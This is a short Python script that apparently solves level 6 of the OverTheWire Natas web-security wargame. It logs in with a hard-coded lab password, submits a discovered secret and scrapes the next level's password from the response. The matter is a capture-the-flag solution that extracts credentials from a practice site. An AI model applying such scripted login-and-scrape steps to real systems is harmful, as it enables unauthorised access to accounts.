#!/usr/bin/env python

import requests
import re
print("Natas Level 6")

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = "http://%s.natas.labs.overthewire.org/"%(username)

# headers = {
# 	"Referer" : "http://natas5.natas.labs.overthewire.org/"
# }

# cookies = {
# 	"loggedin":"1"
# }

data = {
	"secret":"FOEIUWGHFEEUHOFUOIU",
	"submit":"submit"
}

with requests.session() as session:
	response = session.post(url, auth = (username, password), data= data )

	content = response.text 

	# print( content)

	print( re.findall("Access granted. The password for natas7 is (.*)", content)[0] )

